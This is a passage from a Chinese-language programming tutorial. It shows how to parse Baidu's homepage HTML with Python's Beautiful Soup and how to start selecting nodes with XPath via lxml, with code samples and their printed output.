class="attr">id</span>=<span class="string">"ftCon"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"ftConw"</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"lh"</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://home.baidu.com"</span>&gt;</span>关于百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://ir.baidu.com"</span>&gt;</span>About Baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"cp"</span>&gt;</span>©2017 Baidu <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com/duty/"</span>&gt;</span>使用百度前必读<span class="tag">&lt;/<span class="name">a</span>&gt;</span>  <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"cp-feedback"</span> <span class="attr">href</span>=<span class="string">"http://jianyi.baidu.com/"</span>&gt;</span>意见反馈<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 京ICP证030173号  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"//www.baidu.com/img/gs.gif"</span>/&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">body</span>&gt;</span> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>从上述代码中，我们可以看见打印出的内容有点过于杂乱无章，为了使得解析后的页面清洗直观，我们可以使用<code>prettify()</code>方法来对其进行标准的缩进操作，为了方便讲解，博主对结果进行适当的删除，只留下有价值的内容，源码及输出如下：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bd_soup = BeautifulSoup(<span class="name">response</span>.text, <span class="string">"lxml"</span>)</span><br><span class="line">print(<span class="name">bd_soup</span>.prettify())</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">   百度一下，你就知道</span><br><span class="line">  <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span> <span class="attr">link</span>=<span class="string">"#0000cc"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"head"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"head_wrapper"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"s_form"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"s_form_wrapper"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"lg"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">height</span>=<span class="string">"129"</span> <span class="attr">hidefocus</span>=<span class="string">"true"</span> <span class="attr">src</span>=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> <span class="attr">width</span>=<span class="string">"270"</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"u1"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://news.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trnews"</span>&gt;</span></span><br><span class="line">       新闻</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"https://www.hao123.com"</span> <span class="attr">name</span>=<span class="string">"tj_trhao123"</span>&gt;</span></span><br><span class="line">       hao123</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://map.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trmap"</span>&gt;</span></span><br><span class="line">       地图</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://v.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trvideo"</span>&gt;</span></span><br><span class="line">       视频</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://tieba.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trtieba"</span>&gt;</span></span><br><span class="line">       贴吧</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"bri"</span> <span class="attr">href</span>=<span class="string">"//www.baidu.com/more/"</span> <span class="attr">name</span>=<span class="string">"tj_briicon"</span> <span class="attr">style</span>=<span class="string">"display: block;"</span>&gt;</span></span><br><span class="line">       更多产品</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"ftCon"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"ftConw"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"lh"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://home.baidu.com"</span>&gt;</span></span><br><span class="line">       关于百度</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://ir.baidu.com"</span>&gt;</span></span><br><span class="line">       About Baidu</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"cp"</span>&gt;</span></span><br><span class="line">      ©2017 Baidu</span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com/duty/"</span>&gt;</span></span><br><span class="line">       使用百度前必读</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"cp-feedback"</span> <span class="attr">href</span>=<span class="string">"http://jianyi.baidu.com/"</span>&gt;</span></span><br><span class="line">       意见反馈</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      京ICP证030173号</span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"//www.baidu.com/img/gs.gif"</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="节点选择"><a href="#节点选择" class="headerlink" title="节点选择"></a>节点选择</h3><p>在Beautiful Soup中，我们可以很方便的选择想要得到的节点，只需要在<code>bd_soup</code>对象中使用<code>.</code>的方式即可，使用如下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bd_title_bj = bd_soup.title</span><br><span class="line">bd_title_bj_name = bd_soup<span class="selector-class">.title</span><span class="selector-class">.name</span></span><br><span class="line">bd_title_name = bd_soup<span class="selector-class">.title</span><span class="selector-class">.string</span></span><br><span class="line">bd_title_parent_bj_name = bd_soup<span class="selector-class">.title</span><span class="selector-class">.parent</span><span class="selector-class">.name</span></span><br><span class="line">bd_image_bj = bd_soup.img</span><br><span class="line">bd_image_bj_dic = bd_soup<span class="selector-class">.img</span><span class="selector-class">.attrs</span></span><br><span class="line">bd_image_all = bd_soup.find_all(<span class="string">"img"</span>)</span><br><span class="line">bd_image_idlg = bd_soup.find(<span class="string">"div"</span>, id=<span class="string">"lg"</span>)</span><br></pre></td></tr></table></figure>
<p>代码解读：</p>
<ul>
<li><code>bd_soup.title</code>，正如前面所说，Beautiful Soup可以很简单的解析对应的页面，只需要使用<code>bd_soup.</code>的方式进行选择节点即可，该行代码正是获得百度首页html的<code>title</code>节点内容</li>
<li><code>bd_soup.title.name</code>，使用<code>.name</code>的形式即可获取节点的名称</li>
<li>bd_soup.title.string，使用<code>.string</code>的形式即可获得节点当中的内容，这句代码就是获取百度首页的title节点的内容，即浏览器导航条中所显示的<code>百度一下，你就知道</code></li>
<li><code>bd_soup.title.parent.name</code>，使用<code>.parent</code>可以该节点的父节点，通俗地讲就是该节点所对应的上一层节点，然后使用<code>.name</code>获取父节点名称</li>
<li><code>bd_soup.img</code>，如<code>bd_soup.title</code>一样，该代码获取的是<code>img</code>节点，只不过需要注意的是：在上面html中我们可以看见总共有两个<code>img</code>节点，而如果使用<code>.img</code>的话默认是获取html中的第一个<code>img</code>节点，而不是所有</li>
<li><code>bd_soup.img.attrs</code>，获取<code>img</code>节点中所有的属性及属性内容，该代码输出的结果是一个键值对的字典格式，所以之后我们只需要通过字典的操作来获取属性所对应的内容即可。比如<code>bd_soup.img.attrs.get(&quot;src&quot;)</code>和<code>bd_soup.img.attrs[&quot;src&quot;]</code>的方式来获取<code>img</code>节点所对应的<code>src</code>属性的内容，即图片链接</li>
<li><code>bd_soup.find_all(&quot;img&quot;)</code>，在上述中的<code>.img</code>操作默认只能获取第一个<code>img</code>节点，而要想获取html中所有的<code>img</code>节点，我们需要使用<code>.find_all(&quot;img&quot;)</code>方法，所返回的是一个列表格式，列表内容为所有的选择的节点</li>
<li><code>bd_soup.find(&quot;div&quot;, id=&quot;lg&quot;)</code>，在实际运用中，我们往往会选择指定的节点，这个时候我们可以使用<code>.find()</code>方法，里面可传入所需查找节点的属性，这里需要注意的是：在传入<code>class</code>属性的时候其中的写法是<code>.find(&quot;div&quot;, class_=&quot;XXX&quot;)</code>的方式。所以该行代码表示的是获取<code>id</code>属性为<code>lg</code>的<code>div</code>节点，此外，在上面的<code>.find_all()</code>同样可以使用该方法来获取指定属性所对应的所有节点</li>
</ul>
<p>上述代码中解析的结果对应打印如下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;百度一下，你就知道&lt;/title&gt;</span><br><span class="line">title</span><br><span class="line">百度一下，你就知道</span><br><span class="line">head</span><br><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">height</span>=<span class="string">"129"</span> hidefocus=<span class="string">"true"</span> src=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> width=<span class="string">"270"</span>/&gt;</span><br><span class="line">&#123;<span class="string">'hidefocus'</span>: <span class="string">'true'</span>, <span class="string">'src'</span>: <span class="string">'//www.baidu.com/img/bd_logo1.png'</span>, <span class="string">'width'</span>: <span class="string">'270'</span>, <span class="string">'height'</span>: <span class="string">'129'</span>&#125;</span><br><span class="line">[&lt;<span class="selector-tag">img</span> <span class="attribute">height</span>=<span class="string">"129"</span> hidefocus=<span class="string">"true"</span> src=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> width=<span class="string">"270"</span>/&gt;, &lt;img src=<span class="string">"//www.baidu.com/img/gs.gif"</span>/&gt;]</span><br><span class="line">&lt;<span class="selector-tag">div</span> id=<span class="string">"lg"</span>&gt; &lt;<span class="selector-tag">img</span> <span class="attribute">height</span>=<span class="string">"129"</span> hidefocus=<span class="string">"true"</span> src=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> width=<span class="string">"270"</span>/&gt; &lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h3 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h3><p>在上一小节节点选择我们讲到了部分数据提取的方法，然而，Beautiful Soup的强大之处还不止步于此。接下来我们继续揭开其神秘的面纱。</p>
<h4 id="get-text"><a href="#get-text" class="headerlink" title=".get_text()"></a>.get_text()</h4><p>获取对象中所有的内容：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">all_content</span> = bd_soup.get_text()</span><br></pre></td></tr></table></figure>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">百度一下，你就知道                     新闻 hao123 地图 视频 贴吧  登录  document.<span class="built_in">write</span>('&lt;a href=<span class="string">"http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u='+ encodeURIComponent(window.location.href+ (window.location.search === "</span><span class="string">" ? "</span>?<span class="string">" : "</span>&amp;<span class="string">")+ "</span>bdorz_come=<span class="number">1</span><span class="string">")+ '"</span> <span class="built_in">name</span>=<span class="string">"tj_login"</span> <span class="built_in">class</span>=<span class="string">"lb"</span>&gt;登录&lt;/a&gt;');</span><br><span class="line"></span><br><span class="line">                更多产品       关于百度 About Baidu  ©<span class="number">2017</span> Baidu 使用百度前必读  意见反馈 京ICP证<span class="number">030173</span>号</span><br></pre></td></tr></table></figure>
<h4 id="strings，-stripped-strings"><a href="#strings，-stripped-strings" class="headerlink" title=".strings，.stripped_strings"></a>.strings，.stripped_strings</h4><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="name">type</span>(<span class="name">bd_soup</span>.strings))</span><br><span class="line"># &lt;class 'generator'&gt;</span><br></pre></td></tr></table></figure>
<p><code>.strings</code>用于提取<code>bd_soup</code>对象中所有的内容，而从上面的输出结果我们可以看出<code>.strings</code>的类型是一个生成器，对此可以使用循环来提取出其中的内容。但是我们在使用<code>.strings</code>的过程中会发现提取出来的内容有很多的空格以及换行，对此我们可以使用<code>.stripped_strings</code>方法来解决该问题，用法如下：</p>
<figure class="highlight golo"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">in</span> bd_soup.stripped_strings:</span><br><span class="line">    <span class="keyword">print</span>(<span class="keyword">each</span>)</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">百度一下，你就知道</span><br><span class="line">新闻</span><br><span class="line"><span class="symbol">hao123</span></span><br><span class="line">地图</span><br><span class="line">视频</span><br><span class="line">贴吧</span><br><span class="line">登录</span><br><span class="line">更多产品</span><br><span class="line">关于百度</span><br><span class="line"><span class="symbol">About</span> <span class="keyword">Baidu</span></span><br><span class="line"><span class="keyword">©2017 </span><span class="keyword">Baidu</span></span><br><span class="line"><span class="keyword">使用百度前必读</span></span><br><span class="line"><span class="keyword">意见反馈</span></span><br><span class="line"><span class="keyword">京ICP证030173号</span></span><br></pre></td></tr></table></figure>
<h4 id="parent，-children，-parents"><a href="#parent，-children，-parents" class="headerlink" title=".parent，.children，.parents"></a>.parent，.children，.parents</h4><p><code>.parent</code>可以选择该节点的父节点，<code>.children</code>可以选择该节点的孩子节点，<code>.parents</code>选择该节点所有的上层节店，返回的是生成器，各用法如下：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bd_div_bj = bd_soup.<span class="builtin-name">find</span>(<span class="string">"div"</span>, <span class="attribute">id</span>=<span class="string">"u1"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(type(bd_div_bj.parent))</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"*"</span> * 50)</span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> bd_div_bj.children:</span><br><span class="line">	<span class="builtin-name">print</span>(child)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"*"</span> * 50)</span><br><span class="line"><span class="keyword">for</span> parent <span class="keyword">in</span> bd_div_bj.parents:</span><br><span class="line">	<span class="builtin-name">print</span>(parent.name)</span><br></pre></td></tr></table></figure>
<p>结果输出：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">class</span> 'bs4.element.Tag'&gt;</span><br><span class="line">**************************************************</span><br><span class="line"> </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"http://news.baidu.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trnews"</span>&gt;新闻&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"https://www.hao123.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trhao123"</span>&gt;hao123&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"http://map.baidu.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trmap"</span>&gt;地图&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"http://v.baidu.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trvideo"</span>&gt;视频&lt;/a&gt;</span><br><span class="line">    </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"http://tieba.baidu.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trtieba"</span>&gt;贴吧&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">**************************************************</span><br><span class="line"><span class="keyword">div</span></span><br><span class="line"><span class="keyword">div</span></span><br><span class="line"><span class="keyword">div</span></span><br><span class="line">body</span><br><span class="line">html</span><br></pre></td></tr></table></figure>
<h3 id="Beautiful-Soup小结"><a href="#Beautiful-Soup小结" class="headerlink" title="Beautiful Soup小结"></a>Beautiful Soup小结</h3><p>Beautiful Soup主要的用法就是以上一些，还有其他一些操作在实际开发过程中使用的不多，这里不做过多的讲解了，所以整体来讲Beautiful Soup的使用还是比较简单的，其他一些操作可见官方文档：<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#contents-children" target="_blank" rel="noopener">https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#contents-children</a></p>
<h2 id="XPath"><a href="#XPath" class="headerlink" title="XPath"></a>XPath</h2><p>XPath全称是XML Path Language，它既可以用来解析XML，也可以用来解析HTML。在上一部分已经讲解了Beautiful Soup的一些常见的骚操作，在这里，我们继续来看看XPath的使用，瞧一瞧XPath的功能到底有多么的强大以致于受到了不少开发者的青睐。同Beautiful Soup一样，在XPath中提供了非常简洁的节点选择的方法，Beautiful Soup主要是通过<code>.</code>的方式来进行子节点或者子孙节点的选择，而在XPath中则主要通过<code>/</code>的方式来选择节点。除此之外，在XPath中还提供了大量的内置函数来处理各个数据之间的匹配关系。</p>
<p>首先，我们先来看看XPath常见的节点匹配规则：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">表达式</th>
<th style="text-align:center">解释说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>/</code></td>
<td style="text-align:center">在当前节点中选取直接子节点</td>
</tr>
<tr>
<td style="text-align:center"><code>//</code></td>
<td style="text-align:center">在当前节点中选取子孙节点</td>
</tr>
<tr>
<td style="text-align:center"><code>.</code></td>
<td style="text-align:center">选取当前节点</td>
</tr>
<tr>
<td style="text-align:center"><code>..</code></td>
<td style="text-align:center">选取当前节点的父节点</td>
</tr>
<tr>
<td style="text-align:center"><code>@</code></td>
<td style="text-align:center">指定属性（id、class……）</td>
</tr>
</tbody>
</table>
</div>
<p>下面我们继续拿上面的百度首页的HTML来讲解下XPath的使用。</p>
<h3 id="节点选择-1"><a href="#节点选择-1" class="headerlink" title="节点选择"></a>节点选择</h3><p>要想正常使用Xpath，我们首先需要正确导入对应的模块，在此我们一般使用的是<code>lxml</code>，操作示例如下：</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from lxml <span class="built_in">import</span> etree</span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> html</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="attr">response</span> = requests.get(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">    <span class="attr">encoding</span> = response.apparent_encoding</span><br><span class="line">    response.<span class="attr">encoding</span> = encoding</span><br><span class="line">    print(response.text)</span><br><span class="line">    <span class="attr">bd_bj</span> = etree.HTML(response.text)</span><br><span class="line">    <span class="attr">bd_html</span> = etree.tostring(bd_bj).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(html.unescape(bd_html))</span><br></pre></td></tr></table></figure>
<p>1~9行代码如Beautiful Soup一致，下面对之后的代码进行解释：</p>
<ul>
<li><code>etree.HTML(response.text)</code>，使用<code>etree</code>模块中的<code>HTML</code>类来对百度html<code>(response.text)</code>进行初始化以构造XPath解析对象，返回的类型为<code>&lt;Element html at 0x1aba86b1c08&gt;</code></li>
<li><code>etree.tostring(bd_html_elem).decode(&quot;utf-8&quot;)</code>，将上述的对象转化为字符串类型且编码为<code>utf-8</code></li>
<li><code>html.unescape(bd_html)</code>，使用HTML5标准定义的规则将<code>bd_html</code>转换成对应的unicode字符。</li>
</ul>
<p>打印出的结果如Beautiful Soup使用时一致，这里就不再显示了，不知道的读者可回翻。既然我们已经得到了Xpath可解析的对象<code>(bd_bj)</code>，下面我们就需要针对这个对象来选择节点了，在上面我们也已经提到了，XPath主要是通过<code>/</code>的方式来提取节点，请看下面Xpath中节点选择的一些常见操作：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">all_bj = bd_bj.xpath(<span class="string">"//*"</span>)             <span class="comment"># 选取所有节点</span></span><br><span class="line">img_bj = bd_bj.xpath(<span class="string">"//img"</span>)           <span class="comment"># 选取指定名称的节点</span></span><br><span class="line">p_a_zj_bj = bd_bj.xpath(<span class="string">"//p/a"</span>)        <span class="comment"># 选取直接节点</span></span><br><span class="line">p_a_all_bj = bd_bj.xpath(<span class="string">"//p//a"</span>)      <span class="comment"># 选取所有节点</span></span><br><span class="line">head_bj = bd_bj.xpath(<span class="string">"//title/.."</span>)     <span class="comment"># 选取父节点</span></span><br></pre></td></tr></table></figure>
<p>结果如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[&lt;Element html <span class="meta">at</span> <span class="number">0x14d6a6d1c88</span>&gt;, &lt;Element head <span class="meta">at</span> <span class="number">0x14d6a6e4408</span>&gt;, &lt;Element meta <span class="meta">at</span> <span class="number">0x14d6a6e4448</span>&gt;, &lt;Element meta <span class="meta">at</span> <span class="number">0x14d6a6e4488</span>&gt;, &lt;Element meta <span class="meta">at</span> <span class="number">0x14d6a6e44c8</span>&gt;, &lt;Element link <span class="meta">at</span> <span class="number">0x14d6a6e4548</span>&gt;, &lt;Element title <span class="meta">at</span> <span class="number">0x14d6a6e4588</span>&gt;, &lt;Element body <span class="meta">at</span> <span class="number">0x14d6a6e45c8</span>&gt;, &lt;Element <span class="keyword">div</span> <span class="meta">at</span> <span class="number">0x14d6a6e4608</span>&gt;, &lt;Element <span class="keyword">div</span> <span class="meta">at</span> <span class="number">0x14d6a6e4508</span>&gt;, &lt;Element <span class="keyword">div</span> <span class="meta">at</span> <span class="number">0x14d6a6e4648</span>&gt;, &lt;Element <span class="keyword">div</span> <span class="meta">at</span> <span class="number">0x14d6a6e4688</span>&gt;, ......]</span><br><span class="line"></span><br><span class="line">[&lt;Element img <span class="meta">at</span> <span class="number">0x14d6a6e4748</span>&gt;, &lt;Element img <span class="meta">at</span> <span class="number">0x14d6a6e4ec8</span>&gt;]</span><br><span class="line"></span><br><span class="line">[&lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4d88</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4dc8</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4e48</span>&gt;, &lt;Element a <span class="meta">at</span> <span 